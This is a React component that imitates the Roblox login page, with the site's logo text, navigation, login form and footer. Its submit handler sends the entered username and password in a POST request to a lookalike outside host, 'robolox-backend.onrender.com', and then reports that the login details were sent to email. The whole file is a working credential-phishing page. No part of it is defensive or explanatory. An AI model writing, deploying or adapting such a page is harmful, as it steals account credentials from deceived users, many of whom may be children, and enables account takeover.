import { useState } from 'react';
import './App.css';

function App() {
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const { username, password } = formData;

    if (!username.trim() || !password.trim()) {
      alert("Please fill in both username and password.");
      return;
    }

    try {
      const response = await fetch("https://robolox-backend.onrender.com/send-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        alert("Login details sent to email.");
      } else {
        alert("Error sending data.");
      }
    } catch (error) {
      alert("Could not connect to server.");
      console.error(error);
    }
  };

  return (
    <div className="container">
      <header className="navbar">
        <div className="logo">Roblox</div>
        <nav className="nav-links">
          <a href="#">Charts</a>
          <a href="#">Marketplace</a>
          <a href="#">Create</a>
          <a href="#">Robux</a>
        </nav>
        <div className="search-signup">
          <input type="text" placeholder="Search" className="search" />
          <button className="signup-btn">Sign Up</button>
        </div>
      </header>

      <main className="login-section">
        <form onSubmit={handleSubmit} className="login-form">
          <h2 className="form-title">Login to Roblox</h2>
          <input name="username" placeholder="Username/Email" onChange={handleChange} required />
          <input name="password" type="password" placeholder="Password" onChange={handleChange} required />
          <button type="submit" className="login-btn">Log In</button>
          <p className="form-link">Forgot Password or Username?</p>
          <hr />
          <button className="login-btn secondary">Email Me a One-Time Code</button>
          <button className="login-btn secondary">Use Another Device</button>
          <p className="signup-prompt">
            Don’t have an account? <span className="signup-link">Sign Up</span>
          </p>
        </form>
      </main>

      <footer className="footer">
        <a href="#">About Us</a>
        <a href="#">Jobs</a>
        <a href="#">Blog</a>
        <a href="#">Help</a>
      </footer>
    </div>
  );
}

export default App;
